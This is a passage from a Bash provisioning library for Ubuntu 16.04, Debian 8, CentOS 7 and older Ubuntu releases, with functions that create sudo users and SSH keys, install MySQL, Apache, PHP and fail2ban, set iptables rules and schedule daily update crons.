      install -y sudo\n    adduser $USERNAME\n    echo \"$USERNAME:$USERPASS\" | chpasswd\n    usermod
      -aG wheel $USERNAME\n}\n\nfunction centos7_key_user {\n\t# Adds public SSH key
      to non-root user\n\n\tUSERNAME=\"$1\"\n    KEY=\"$2\"\n    if [ ! -n \"$USERNAME\"
      ] || [ ! -n \"$KEY\" ]; then\n        echo \"No username and/or public key entered.\"\n        return
      1;\n    fi\n\n\tmkdir /home/$1/.ssh\n\techo $2 > /home/$1/.ssh/authorized_keys\n\tchown
      -R $1:$1 /home/$1/*\n\tchown -R $1:$1 /home/$1/.*\n}\n\nfunction centos7_ssh_disable_root
      {\n\t# Disables root SSH login and restarts SSH\n\n    sed -i -e ''s/PermitRootLogin\\
      yes/PermitRootLogin\\ no/g'' /etc/ssh/sshd_config\n    systemctl restart sshd  \n}\n\n#
      MySQL\n#######\n\nfunction ubuntu1604_install_mysql {\n\techo \"mysql-server
      mysql-server/root_password password $1\" | debconf-set-selections\n\techo \"mysql-server
      mysql-server/root_password_again password $1\" | debconf-set-selections\n\tapt-get
      install -y mysql-server\n\tsystemctl enable mysql\n}\n\nfunction debian8_install_mysql
      {\n\techo \"mysql-server mysql-server/root_password password $1\" | debconf-set-selections\n\techo
      \"mysql-server mysql-server/root_password_again password $1\" | debconf-set-selections\n\tapt-get
      install -y mysql-server\n\tsystemctl enable mysql\n}\n\nfunction centos7_install_mysql
      {\n\tyum install mariadb-server -y\n\tsystemctl enable mariadb\n}\n\nfunction
      mysql_create_database {\n\t# Creates MySQL Database with user-determined name\n\t\n\tDBPASS=\"$1\"\n\tDBNAME=\"$2\"\n\tif
      [ ! -n \"$DBPASS\" ] || [ ! -n \"$DBNAME\" ]; then\n\t\techo \"No Database Name
      and/or MySQL Password entered.\"\n\t\treturn 1;\n\tfi\n\n\techo \"CREATE DATABASE
      $2;\" | mysql -u root -p$1\n}\n\nfunction mysql_create_user {\n\t# Creates non-root
      MySQL\n\n\tDBPASS=\"$1\"\n\tUSER=\"$2\"\n\tUSERPASS=\"$3\"\n\tif [ ! -n \"$DBPASS\"
      ] || [ ! -n \"$USER\" ] || [ ! -n \"$USERPASS\" ]; then\n\t\techo \"MySQL Username,
      Username Password and MySQL Root Password are Required.\"\n\t\treturn 1;\n\tfi\n\n\techo
      \"CREATE USER ''$2''@''localhost'' IDENTIFIED BY ''$3'';\" | mysql -u root -p$1\n}\n\nfunction
      mysql_grant_user {\n\t# Grants privileges for non-root MySQL user on user-defined
      database.\n\n\tDBPASS=\"$1\"\n\tUSER=\"$2\"\n\tDB=\"$3\"\n\tif [ ! -n \"$DBPASS\"
      ] || [ ! -n \"$USER\" ] || [ ! -n \"$DB\" ]; then\n\t\techo \"MySQL Username,
      Database and MySQL Root Password are Required.\"\n\t\treturn 1;\n\tfi\n\n\techo
      \"GRANT ALL PRIVILEGES ON $3.* TO ''$2''@''localhost'';\" | mysql -u root -p$1\n    echo
      \"FLUSH PRIVILEGES;\" | mysql -u root -p$1\n}\n\nfunction centos7_mysql_setpass
      {\n\t# Sets root password for MariaDB\n\n\tDBPASS=\"$1\"\n\tif [ ! -n \"$DBPASS\"];
      then\n\t\techo \"No Database Password Set\"\n\t\treturn 1;\n\tfi\n\n\techo \"SET
      PASSWORD FOR ''root''@''localhost'' = PASSWORD(''$1'');\" | mysql -u root\n}\n\nfunction
      ubuntu1604_mysql_secure_installation {\n\t# Installs expect, runs mysql_secure_installation
      then uninstall expect \n\n\tapt-get install -y expect\n\tSECURE_MYSQL=$(expect
      -c \"\n\tset timeout 10\n\tspawn mysql_secure_installation\n\texpect \\\"Enter
      current password for root (enter for none):\\\"\n\tsend \\\"$MYSQL\\r\\\"\n\texpect
      \\\"Change the root password?\\\"\n\tsend \\\"n\\r\\\"\n\texpect \\\"Remove
      anonymous users?\\\"\n\tsend \\\"y\\r\\\"\n\texpect \\\"Disallow root login
      remotely?\\\"\n\tsend \\\"y\\r\\\"\n\texpect \\\"Remove test database and access
      to it?\\\"\n\tsend \\\"y\\r\\\"\n\texpect \\\"Reload privilege tables now?\\\"\n\tsend
      \\\"y\\r\\\"\n\texpect eof\n\t\")\n\n\techo \"$SECURE_MYSQL\"\n\n\tapt-get purge
      -y expect\n}\n\nfunction debian8_mysql_secure_installation {\n\t# Installs expect,
      runs mysql_secure_installation then uninstall expect \n\n\tapt-get install -y
      expect\n\tSECURE_MYSQL=$(expect -c \"\n\tset timeout 10\n\tspawn mysql_secure_installation\n\texpect
      \\\"Enter current password for root (enter for none):\\\"\n\tsend \\\"$MYSQL\\r\\\"\n\texpect
      \\\"Change the root password?\\\"\n\tsend \\\"n\\r\\\"\n\texpect \\\"Remove
      anonymous users?\\\"\n\tsend \\\"y\\r\\\"\n\texpect \\\"Disallow root login
      remotely?\\\"\n\tsend \\\"y\\r\\\"\n\texpect \\\"Remove test database and access
      to it?\\\"\n\tsend \\\"y\\r\\\"\n\texpect \\\"Reload privilege tables now?\\\"\n\tsend
      \\\"y\\r\\\"\n\texpect eof\n\t\")\n\n\techo \"$SECURE_MYSQL\"\n\n\tapt-get purge
      -y expect\n}\n\nfunction centos7_mysql_secure_installation {\n\t# Installs expect,
      runs mysql_secure_installation then uninstall expect \n\n\tyum install -y expect\n\tSECURE_MYSQL=$(expect
      -c \"\n\tset timeout 10\n\tspawn mysql_secure_installation\n\texpect \\\"Enter
      current password for root (enter for none):\\\"\n\tsend \\\"$1\\r\\\"\n\texpect
      \\\"Change the root password?\\\"\n\tsend \\\"n\\r\\\"\n\texpect \\\"Remove
      anonymous users?\\\"\n\tsend \\\"y\\r\\\"\n\texpect \\\"Disallow root login
      remotely?\\\"\n\tsend \\\"y\\r\\\"\n\texpect \\\"Remove test database and access
      to it?\\\"\n\tsend \\\"y\\r\\\"\n\texpect \\\"Reload privilege tables now?\\\"\n\tsend
      \\\"y\\r\\\"\n\texpect eof\n\t\")\n\n\techo \"$SECURE_MYSQL\"\n\n\tyum remove
      -y expect\n}\n\n# Apache\n########\n\nfunction ubuntu1604_install_apache {\n\tapt-get
      install -y apache2\n\tsystemctl enable apache2\n}\n\nfunction debian8_install_apache
      {\n\tapt-get install -y apache2\n\tsystemctl enable apache2\n}\n\nfunction ubuntu1604_apache_create_virtualhost
      {\n\t# Creates Apache2 VirtualHost for user-defined domain.\n\n\tDOMAIN=\"$1\"\n\tif
      [ ! -n \"$DOMAIN\" ]; then\n\t\techo \"No FQDN Defined.\"\n\t\treturn 1;\n\tfi\n\n\t#
      Creates webroot directory and log directory\n    mkdir -p /var/www/$1/{public_html,logs}\n    #
      Creates VirtualHost file\n    touch /etc/apache2/sites-available/$1.conf\n    echo
      \"<VirtualHost *:80>\" >> /etc/apache2/sites-available/$1.conf\n    echo \"     ServerAdmin
      webmaster@$1\" >> /etc/apache2/sites-available/$1.conf\n    echo \"     ServerName
      $1\" >> /etc/apache2/sites-available/$1.conf\n    echo \"     ServerAlias www.$1\"
      >> /etc/apache2/sites-available/$1.conf\n    echo \"     DocumentRoot /var/www/$1/public_html/\"
      >> /etc/apache2/sites-available/$1.conf\n    echo \"     ErrorLog /var/www/$1/logs/$1-error.log\"
      >> /etc/apache2/sites-available/$1.conf\n    echo \"     CustomLog /var/www/$1/logs/$1-access.log
      combined\" >> /etc/apache2/sites-available/$1.conf\n    echo \"</VirtualHost>\"
      >> /etc/apache2/sites-available/$1.conf\n    # Enables the VirtualHost\n    a2ensite
      $1.conf\n    # Creates temporary index.html file with the FQDN\n   \techo \"<html><head><title>$1</title></head><body><h1>$1</h1></body></html>\"
      > /var/www/$1/public_html/index.html\n   \t# Enables Apache2 to start on boot
      and restarts Apache2.\n    systemctl enable apache2\n    systemctl restart apache2\n}\n\nfunction
      debian8_apache_create_virtualhost {\n\t# Creates Apache2 VirtualHost for user-defined
      domain.\n\n\tDOMAIN=\"$1\"\n\tif [ ! -n \"$DOMAIN\" ]; then\n\t\techo \"No FQDN
      Defined.\"\n\t\treturn 1;\n\tfi\n\n\t# Creates webroot directory and log directory\n    mkdir
      -p /var/www/$1/{public_html,logs}\n    # Creates VirtualHost file\n    touch
      /etc/apache2/sites-available/$1.conf\n    echo \"<VirtualHost *:80>\" >> /etc/apache2/sites-available/$1.conf\n    echo
      \"     ServerAdmin webmaster@$1\" >> /etc/apache2/sites-available/$1.conf\n    echo
      \"     ServerName $1\" >> /etc/apache2/sites-available/$1.conf\n    echo \"     ServerAlias
      www.$1\" >> /etc/apache2/sites-available/$1.conf\n    echo \"     DocumentRoot
      /var/www/$1/public_html/\" >> /etc/apache2/sites-available/$1.conf\n    echo
      \"     ErrorLog /var/www/$1/logs/$1-error.log\" >> /etc/apache2/sites-available/$1.conf\n    echo
      \"     CustomLog /var/www/$1/logs/$1-access.log combined\" >> /etc/apache2/sites-available/$1.conf\n    echo
      \"</VirtualHost>\" >> /etc/apache2/sites-available/$1.conf\n    # Enables the
      VirtualHost\n    a2ensite $1.conf\n    # Creates temporary index.html file with
      the FQDN\n   \techo \"<html><head><title>$1</title></head><body><h1>$1</h1></body></html>\"
      > /var/www/$1/public_html/index.html\n   \t# Enables Apache2 to start on boot
      and restarts Apache2.\n    systemctl enable apache2\n    systemctl restart apache2\n}\n\nfunction
      ubuntu1604_apache_tune {\n\t# Disables KeepAlive, tunes Apache2 variables in
      mpm-prefork and switches to mpm-prefork module.\n\n\techo \"<IfModule mpm_prefork_module>\"
      > /etc/apache2/mods-available/mpm-prefork.conf\n\techo \"        StartServers            4\"
      >> /etc/apache2/mods-available/mpm-prefork.conf\n\techo \"        MinSpareServers         20\"
      >> /etc/apache2/mods-available/mpm-prefork.conf\n\techo \"        MaxSpareServers         40\"
      >> /etc/apache2/mods-available/mpm-prefork.conf\n\techo \"        MaxRequestWorkers       200\"
      >> /etc/apache2/mods-available/mpm-prefork.conf\n\techo \"        MaxConnectionsPerChild  4500\"
      >> /etc/apache2/mods-available/mpm-prefork.conf\n\techo \"</IfModule>\" >> /etc/apache2/mods-available/mpm-prefork.conf\n\ta2dismod
      mpm_event\n\ta2enmod mpm_prefork\n}\n\nfunction debian8_apache_tune {\n\t# Disables
      KeepAlive, tunes Apache2 variables in mpm-prefork and switches to mpm-prefork
      module.\n\n\techo \"<IfModule mpm_prefork_module>\" > /etc/apache2/mods-available/mpm-prefork.conf\n\techo
      \"        StartServers            4\" >> /etc/apache2/mods-available/mpm-prefork.conf\n\techo
      \"        MinSpareServers         20\" >> /etc/apache2/mods-available/mpm-prefork.conf\n\techo
      \"        MaxSpareServers         40\" >> /etc/apache2/mods-available/mpm-prefork.conf\n\techo
      \"        MaxRequestWorkers       200\" >> /etc/apache2/mods-available/mpm-prefork.conf\n\techo
      \"        MaxConnectionsPerChild  4500\" >> /etc/apache2/mods-available/mpm-prefork.conf\n\techo
      \"</IfModule>\" >> /etc/apache2/mods-available/mpm-prefork.conf\n\ta2dismod
      mpm_event\n\ta2enmod mpm_prefork\n}\n\nfunction centos7_install_apache {\n\tyum
      install httpd -y\n\tsystemctl enable httpd\n}\n\nfunction centos7_apache_create_virtualhost
      {\n\t# Creates httpd VirtualHost for user-defined domain.\t\n\n\tDOMAIN=\"$1\"\n\tif
      [ ! -n \"$DOMAIN\" ]; then\n\t\techo \"No FQDN Defined.\"\n\t\treturn 1;\n\tfi\n\n\t#
      Creates webroot directory and log directory\n\tmkdir -p /var/www/$1/{public_html,logs}\n\t#
      Creates VirtualHost file\n\ttouch /etc/httpd/conf.d/vhost.conf\n\techo \"NameVirtualHost
      *:80\" >> /etc/httpd/conf.d/vhost.conf\n\techo \"<VirtualHost *:80>\" >> /etc/httpd/conf.d/vhost.conf\n\techo
      \"     ServerAdmin webmaster@$1\" >> /etc/httpd/conf.d/vhost.conf\n\techo \"     ServerAlias
      www.$1\" >> /etc/httpd/conf.d/vhost.conf\n\techo \"     DocumentRoot /var/www/$1/public_html/\"
      >> /etc/httpd/conf.d/vhost.conf\n\techo \"     ErrorLog /var/www/$1/logs/$1-error.log\"
      >> /etc/httpd/conf.d/vhost.conf\n\techo \"     CustomLog /var/www/$1/logs/$1-access.log
      combined\" >> /etc/httpd/conf.d/vhost.conf\n\techo \"</VirtualHost>\" >> /etc/httpd/conf.d/vhost.conf\n\t#
      Creates temporary index.html file with the FQDN\n\techo \"<html><head><title>$1</title></head><body><h1>$1</h1></body></html>\"
      > /var/www/$1/public_html/index.html\n\t# Enables httpd to start on boot and
      restarts httpd.\n\tsystemctl enable httpd\n\tsystemctl restart httpd\n}\n\nfunction
      centos7_apache_tune {\n\t# Disables KeepAlive and tunes variables for prefork
      module.\n\n\techo \"KeepAlive Off\" >> /etc/httpd/conf/httpd.conf\n\techo \"<IfModule
      prefork.c>\" >> /etc/httpd/conf/httpd.conf\n\techo \"    StartServers        4\"
      >> /etc/httpd/conf/httpd.conf\n\techo \"    MinSpareServers     20\" >> /etc/httpd/conf/httpd.conf\n\techo
      \"    MaxSpareServers     40\" >> /etc/httpd/conf/httpd.conf\n\techo \"    MaxClients          200\"
      >> /etc/httpd/conf/httpd.conf\n\techo \"    MaxRequestsPerChild 4500\" >> /etc/httpd/conf/httpd.conf\n\techo
      \"</IfModule>\" >> /etc/httpd/conf/httpd.conf\n}\n\nfunction ubuntu1604_apache_virtualhost_get_docroot
      {\n    if [ ! -n \"$1\" ]; then\n        echo \"apache_virtualhost_get_docroot()
      requires the hostname as the first argument\"\n        return 1;\n    fi\n\n    if
      [ -e /etc/apache2/sites-available/$1 ];\n        then echo $(awk ''/DocumentRoot/
      {print $2}'' /etc/apache2/sites-available/$1 )\n    fi\n}\n\nfunction debian8_apache_virtualhost_get_docroot
      {\n    if [ ! -n \"$1\" ]; then\n        echo \"apache_virtualhost_get_docroot()
      requires the hostname as the first argument\"\n        return 1;\n    fi\n\n    if
      [ -e /etc/apache2/sites-available/$1 ];\n        then echo $(awk ''/DocumentRoot/
      {print $2}'' /etc/apache2/sites-available/$1 )\n    fi\n}\n\n# PHP\n#####\n\nfunction
      ubuntu1604_install_php {\n\tapt-get install -y php7.0 php-pear libapache2-mod-php7.0
      php7.0-mysql php7.0-curl php7.0-json php7.0-cgi\n}\n\nfunction debian8_install_php
      {\n\tapt-get install -y php7.0 php-pear libapache2-mod-php7.0 php7.0-mysql php7.0-curl
      php7.0-json php7.0-cgi\n}\n\nfunction centos7_install_php {\n\tyum install php
      php-pear php-mysql -y\n}\n\nfunction ubuntu1604_php_tune {\n\t# Tunes PHP for
      optimal values and enabled logging.\n\n\tsed -i -e ''s/max_input_time\\ \\=\\
      60/max_input_time\\ \\=\\ 30/g'' /etc/php/7.0/apache2/php.ini\n\tsed -i -e ''s/error_reporting\\
      \\=\\ E_ALL\\ \\&\\ ~E_DEPRECATED\\ \\&\\ ~E_STRICT/error_reporting\\ \\=\\
      E_COMPILE_ERROR\\ \\|\\ E_RECOVERABLE_ERROR\\ \\|\\ E_ERROR\\ \\|\\ E_CORE_ERROR/g''
      /etc/php/7.0/apache2/php.ini\n\tsed -i -e ''s/\\;error_log\\ \\=\\ php_errors.log/error_log\\
      \\=\\ \\/var\\/log\\/php\\/error.log/g'' /etc/php/7.0/apache2/php.ini\n\tmkdir
      /var/log/php\n\tchown www-data /var/log/php\n\tsystemctl restart apache2\n}\n\nfunction
      debian8_php_tune {\n\t# Tunes PHP for optimal values and enabled logging.\n\n\tsed
      -i -e ''s/max_input_time\\ \\=\\ 60/max_input_time\\ \\=\\ 30/g'' /etc/php/7.0/apache2/php.ini\n\tsed
      -i -e ''s/error_reporting\\ \\=\\ E_ALL\\ \\&\\ ~E_DEPRECATED\\ \\&\\ ~E_STRICT/error_reporting\\
      \\=\\ E_COMPILE_ERROR\\ \\|\\ E_RECOVERABLE_ERROR\\ \\|\\ E_ERROR\\ \\|\\ E_CORE_ERROR/g''
      /etc/php/7.0/apache2/php.ini\n\tsed -i -e ''s/\\;error_log\\ \\=\\ php_errors.log/error_log\\
      \\=\\ \\/var\\/log\\/php\\/error.log/g'' /etc/php/7.0/apache2/php.ini\n\tmkdir
      /var/log/php\n\tchown www-data /var/log/php\n\tsystemctl restart apache2\n}\n\nfunction
      centos7_php_tune {\n\t# Tunes PHP for optimal values and enabled logging.\n\n\tsed
      -i -e ''s/max_input_time\\ \\=\\ 60/max_input_time\\ \\=\\ 30/g'' /etc/php.ini\n\tsed
      -i -e ''s/error_reporting\\ \\=\\ E_ALL\\ \\&\\ ~E_DEPRECATED\\ \\&\\ ~E_STRICT/error_reporting\\
      \\=\\ E_COMPILE_ERROR\\ \\|\\ E_RECOVERABLE_ERROR\\ \\|\\ E_ERROR\\ \\|\\ E_CORE_ERROR/g''
      /etc/php.ini\n\tsed -i -e ''s/\\;error_log\\ \\=\\ php_errors.log/error_log\\
      \\=\\ \\/var\\/log\\/php\\/error.log/g'' /etc/php.ini\n\tmkdir /var/log/php\n\tchown
      apache /var/log/php\n\tsystemctl reload httpd\n}\n\n# Fail2Ban\n##########\n\nfunction
      ubuntu1604_install_fail2ban {\n\tapt-get install -y fail2ban\n\tsystemctl enable
      fail2ban\n\tsystemctl start fail2ban\n}\n\nfunction debian8_install_fail2ban
      {\n\tapt-get install -y fail2ban\n\tsystemctl enable fail2ban\n\tsystemctl start
      fail2ban\n}\n\nfunction centos7_install_fail2ban {\n\tyum install fail2ban -y\n\tsystemctl
      enable fail2ban\n\tsystemctl start fail2ban\n}\n\n# iptables\n##########\n\nfunction
      ubuntu1604_iptables_lamp {\n\t# Configures optimal iptables/ip6tables rules
      for a LAMP stack.\n\t# Installs/configures iptables-persistent.\n\n\tiptables
      -A INPUT -i lo -j ACCEPT\n\tiptables -A INPUT ! -i lo -s 127.0.0.0/8 -j REJECT\n\tiptables
      -A INPUT -p icmp -m state --state NEW --icmp-type 8 -j ACCEPT\n\tiptables -A
      INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT\n\tiptables -A INPUT
      -p tcp --dport 80 -m state --state NEW -j ACCEPT\n\tiptables -A INPUT -p tcp
      --dport 443 -m state --state NEW -j ACCEPT\n\tiptables -A INPUT -m state --state
      ESTABLISHED,RELATED -j ACCEPT\n\tiptables -A INPUT -m limit --limit 5/min -j
      LOG --log-prefix \"iptables_INPUT_denied: \" --log-level 7\n\tiptables -A INPUT
      -j REJECT\n\tiptables -A FORWARD -m limit --limit 5/min -j LOG --log-prefix
      \"iptables_FORWARD_denied: \" --log-level 7\n\tiptables -A FORWARD -j REJECT\n\tip6tables
      -A INPUT -i lo -j ACCEPT\n\tip6tables -A INPUT ! -i lo -s ::1/128 -j REJECT\n\tip6tables
      -A INPUT -p icmpv6 -j ACCEPT\n\tip6tables -A INPUT -p tcp --dport 80 -m state
      --state NEW -j ACCEPT\n\tip6tables -A INPUT -p tcp --dport 443 -m state --state
      NEW -j ACCEPT\n\tip6tables -A INPUT -m state --state ESTABLISHED,RELATED -j
      ACCEPT\n\tip6tables -A INPUT -m limit --limit 5/min -j LOG --log-prefix \"ip6tables_INPUT_denied:
      \" --log-level 7\n\tip6tables -A INPUT -j REJECT\n\tip6tables -A FORWARD -m
      limit --limit 5/min -j LOG --log-prefix \"ip6tables_FORWARD_denied: \" --log-level
      7\n\tip6tables -A FORWARD -j REJECT\n\techo \"iptables-persistent iptables-persistent/autosave_v4
      boolean true\" | debconf-set-selections\n\techo \"iptables-persistent iptables-persistent/autosave_v6
      boolean true\" | debconf-set-selections\n\tapt-get install -y iptables-persistent\n}\n\nfunction
      debian8_iptables_lamp {\n\t# Configures optimal iptables/ip6tables rules for
      a LAMP stack.\n\t# Installs/configures iptables-persistent.\n\n\tiptables -A
      INPUT -i lo -j ACCEPT\n\tiptables -A INPUT ! -i lo -s 127.0.0.0/8 -j REJECT\n\tiptables
      -A INPUT -p icmp -m state --state NEW --icmp-type 8 -j ACCEPT\n\tiptables -A
      INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT\n\tiptables -A INPUT
      -p tcp --dport 80 -m state --state NEW -j ACCEPT\n\tiptables -A INPUT -p tcp
      --dport 443 -m state --state NEW -j ACCEPT\n\tiptables -A INPUT -m state --state
      ESTABLISHED,RELATED -j ACCEPT\n\tiptables -A INPUT -m limit --limit 5/min -j
      LOG --log-prefix \"iptables_INPUT_denied: \" --log-level 7\n\tiptables -A INPUT
      -j REJECT\n\tiptables -A FORWARD -m limit --limit 5/min -j LOG --log-prefix
      \"iptables_FORWARD_denied: \" --log-level 7\n\tiptables -A FORWARD -j REJECT\n\tip6tables
      -A INPUT -i lo -j ACCEPT\n\tip6tables -A INPUT ! -i lo -s ::1/128 -j REJECT\n\tip6tables
      -A INPUT -p icmpv6 -j ACCEPT\n\tip6tables -A INPUT -p tcp --dport 80 -m state
      --state NEW -j ACCEPT\n\tip6tables -A INPUT -p tcp --dport 443 -m state --state
      NEW -j ACCEPT\n\tip6tables -A INPUT -m state --state ESTABLISHED,RELATED -j
      ACCEPT\n\tip6tables -A INPUT -m limit --limit 5/min -j LOG --log-prefix \"ip6tables_INPUT_denied:
      \" --log-level 7\n\tip6tables -A INPUT -j REJECT\n\tip6tables -A FORWARD -m
      limit --limit 5/min -j LOG --log-prefix \"ip6tables_FORWARD_denied: \" --log-level
      7\n\tip6tables -A FORWARD -j REJECT\n\techo \"iptables-persistent iptables-persistent/autosave_v4
      boolean true\" | debconf-set-selections\n\techo \"iptables-persistent iptables-persistent/autosave_v6
      boolean true\" | debconf-set-selections\n\tapt-get install -y iptables-persistent\n}\n\nfunction
      centos7_iptables_lamp {\n\t# Stops and Disables firewalld.\n\t# Installs iptables-services,
      configures optimal iptables/ip6tables rules for a LAMP stack.\n\t# Saves iptables/ip6tables
      rules, enables iptables-services to start on boot and starts iptables-services.\n\n\tsystemctl
      stop firewalld.service && systemctl disable firewalld.service\n\tyum install
      -y iptables-services\n\tiptables -A INPUT -i lo -j ACCEPT\n\tiptables -A INPUT
      ! -i lo -s 127.0.0.0/8 -j REJECT\n\tiptables -A INPUT -p icmp -m state --state
      NEW --icmp-type 8 -j ACCEPT\n\tiptables -A INPUT -p tcp --dport 22 -m state
      --state NEW -j ACCEPT\n\tiptables -A INPUT -p tcp --dport 80 -m state --state
      NEW -j ACCEPT\n\tiptables -A INPUT -p tcp --dport 443 -m state --state NEW -j
      ACCEPT\n\tiptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\tiptables
      -A INPUT -m limit --limit 5/min -j LOG --log-prefix \"iptables_INPUT_denied:
      \" --log-level 7\n\tiptables -A INPUT -j REJECT\n\tiptables -A FORWARD -m limit
      --limit 5/min -j LOG --log-prefix \"iptables_FORWARD_denied: \" --log-level
      7\n\tiptables -A FORWARD -j REJECT\n\tip6tables -A INPUT -i lo -j ACCEPT\n\tip6tables
      -A INPUT ! -i lo -s ::1/128 -j REJECT\n\tip6tables -A INPUT -p icmpv6 -j ACCEPT\n\tip6tables
      -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT\n\tip6tables -A INPUT
      -p tcp --dport 443 -m state --state NEW -j ACCEPT\n\tip6tables -A INPUT -m state
      --state ESTABLISHED,RELATED -j ACCEPT\n\tip6tables -A INPUT -m limit --limit
      5/min -j LOG --log-prefix \"ip6tables_INPUT_denied: \" --log-level 7\n\tip6tables
      -A INPUT -j REJECT\n\tip6tables -A FORWARD -m limit --limit 5/min -j LOG --log-prefix
      \"ip6tables_FORWARD_denied: \" --log-level 7\n\tip6tables -A FORWARD -j REJECT\n\tservice
      iptables save\n\tservice ip6tables save\n\tsystemctl enable iptables && systemctl
      enable ip6tables\n\tsystemctl start iptables && systemctl start ip6tables\n}\n\n#
      Crons\n#######\n\nfunction ubuntu1604_update_cron {\n\t# Configures a cron job
      to update the system every day at 1AM. \n\n\techo \"00 1 * * * apt-get update
      && apt-get upgrade -y\" > /root/.cron\n\tcrontab -u root /root/.cron\n}\n\nfunction
      debian8_update_cron {\n\t# Configures a cron job to update the system every
      day at 1AM. \n\n\techo \"00 1 * * * apt-get update && apt-get upgrade -y\" >
      /root/.cron\n\tcrontab -u root /root/.cron\n}\n\nfunction centos7_update_cron
      {\n\t# Configures a cron job to update the system every day at 1AM. \n\n\techo
      \"00 1 * * * yum update -y\" > /root/.cron\n\tcrontab -u root /root/.cron\n}\n\n\n#########################\n#
      Deprecated Ubuntu 12.04\n#########################\n\nfunction system_update
      {\n    apt-get update\n    apt-get -y install aptitude\n    aptitude -y full-upgrade\n}\n\nfunction
      system_primary_ip {\n    # returns the primary IP assigned to eth0\n    echo
      $(ifconfig eth0 | awk -F: ''/inet addr:/ {print $2}'' | awk ''{ print $1 }'')\n}\n\nfunction
      get_rdns {\n    # calls host on an IP address and returns its reverse dns\n\n    if
      [ ! -e /usr/bin/host ]; then\n        aptitude -y install dnsutils > /dev/null\n    fi\n    echo
      $(host $1 | awk ''/pointer/ {print $5}'' | sed ''s/\\.$//'')\n}\n\nfunction
      get_rdns_primary_ip {\n    # returns the reverse dns of the primary IP assigned
      to this system\n    echo $(get_rdns $(system_primary_ip))\n}\n\nfunction system_set_hostname
      {\n    # $1 - The hostname to define\n    HOSTNAME=\"$1\"\n        \n    if
      [ ! -n \"$HOSTNAME\" ]; then\n        echo \"Hostname undefined\"\n        return
      1;\n    fi\n    \n    echo \"$HOSTNAME\" > /etc/hostname\n    hostname -F /etc/hostname\n}\n\nfunction
      system_add_host_entry {\n    # $1 - The IP address to set a hosts entry for\n    #
      $2 - The FQDN to set to the IP\n    IPADDR=\"$1\"\n    FQDN=\"$2\"\n\n    if
      [ -z \"$IPADDR\" -o -z \"$FQDN\" ]; then\n        echo \"IP address and/or FQDN
      Undefined\"\n        return 1;\n    fi\n    \n    echo $IPADDR $FQDN  >> /etc/hosts\n}\n\n\n###########################################################\n#
      Users and Authentication\n###########################################################\n\nfunction
      user_add_sudo {\n    # Installs sudo if needed and creates a user in the sudo
      group.\n    #\n    # $1 - Required - username\n    # $2 - Required - password\n    USERNAME=\"$1\"\n    USERPASS=\"$2\"\n\n    if
      [ ! -n \"$USERNAME\" ] || [ ! -n \"$USERPASS\" ]; then\n        echo \"No new
      username and/or password entered\"\n        return 1;\n    fi\n    \n    aptitude
      -y install sudo\n    adduser $USERNAME --disabled-password --gecos \"\"\n    echo
      \"$USERNAME:$USERPASS\" | chpasswd\n    usermod -aG sudo $USERNAME\n}\n\nfunction
      user_add_pubkey {\n    # Adds the users public key to authorized_keys for the
      specified user. Make sure you wrap your input variables in double quotes, or
      the key may not load properly.\n    #\n    #\n    # $1 - Required - username\n    #
      $2 - Required - public key\n    USERNAME=\"$1\"\n    USERPUBKEY=\"$2\"\n    \n    if
      [ ! -n \"$USERNAME\" ] || [ ! -n \"$USERPUBKEY\" ]; then\n        echo \"Must
      provide a username and the location of a pubkey\"\n        return 1;\n    fi\n    \n    if
      [ \"$USERNAME\" == \"root\" ]; then\n        mkdir /root/.ssh\n        echo
      \"$USERPUBKEY\" >> /root/.ssh/authorized_keys\n        return 1;\n    fi\n    \n    mkdir
      -p /home/$USERNAME/.ssh\n    echo \"$USERPUBKEY\" >> /home/$USERNAME/.ssh/authorized_keys\n    chown
      -R \"$USERNAME\":\"$USERNAME\" /home/$USERNAME/.ssh\n}\n\nfunction ssh_disable_root
      {\n    # Disables root SSH access.\n    sed -i ''s/PermitRootLogin yes/PermitRootLogin
      no/'' /etc/ssh/sshd_config\n    touch /tmp/restart-ssh\n    \n}\n\n###########################################################\n#
      Postfix\n###########################################################\n\nfunction
      postfix_install_loopback_only {\n    # Installs postfix and configure to listen
      only on the local interface. Also\n    # allows for local mail delivery\n\n    echo
      \"postfix postfix/main_mailer_type select Internet Site\" | debconf-set-selections\n    echo
      \"postfix postfix/mailname string localhost\" | debconf-set-selections\n    echo
      \"postfix postfix/destinations string localhost.localdomain, localhost\" | debconf-set-selections\n    aptitude
      -y install postfix\n    /usr/sbin/postconf -e \"inet_interfaces = loopback-only\"\n    #/usr/sbin/postconf
      -e \"local_transport = error:local delivery is disabled\"\n\n    touch /tmp/restart-postfix\n}\n\n\n###########################################################\n#
      Apache\n###########################################################\n\nfunction
      apache_install {\n    # installs the system default apache2 MPM\n    aptitude
      -y install apache2\n\n    a2dissite default # disable the interfering default
      virtualhost\n\n    # clean up, or add the NameVirtualHost line to ports.conf\n    sed
      -i -e ''s/^NameVirtualHost \\*$/NameVirtualHost *:80/'' /etc/apache2/ports.conf\n    if
      ! grep -q NameVirtualHost /etc/apache2/ports.conf; then\n        echo ''NameVirtualHost
      *:80'' > /etc/apache2/ports.conf.tmp\n        cat /etc/apache2/ports.conf >>
      /etc/apache2/ports.conf.tmp\n        mv -f /etc/apache2/ports.conf.tmp /etc/apache2/ports.conf\n    fi\n}\n\nfunction
      apache_tune {\n    # Tunes Apache''s memory to use the percentage of RAM you
      specify, defaulting to 40%\n\n    # $1 - the percent of system memory to allocate
      towards Apache\n\n    if [ ! -n \"$1\" ];\n        then PERCENT=40\n        else
      PERCENT=\"$1\"\n    fi\n\n    aptitude -y install apache2-mpm-prefork\n    PERPROCMEM=10
      # the amount of memory in MB each apache process is likely to utilize\n    MEM=$(grep
      MemTotal /proc/meminfo | awk ''{ print int($2/1024) }'') # how much memory in
      MB this system has\n    MAXCLIENTS=$((MEM*PERCENT/100/PERPROCMEM)) # calculate
      MaxClients\n    MAXCLIENTS=${MAXCLIENTS/.*} # cast to an integer\n    sed -i
      -e \"s/\\(^[ \\t]*MaxClients[ \\t]*\\)[0-9]*/\\1$MAXCLIENTS/\" /etc/apache2/apache2.conf\n\n    touch
      /tmp/restart-apache2\n}\n\nfunction apache_virtualhost {\n    # Configures a
      VirtualHost\n\n    # $1 - required - the hostname of the virtualhost to create
      \n\n    if [ ! -n \"$1\" ]; then\n        echo \"apache_virtualhost() requires
      the hostname as the first argument\"\n        return 1;\n    fi\n\n    if [
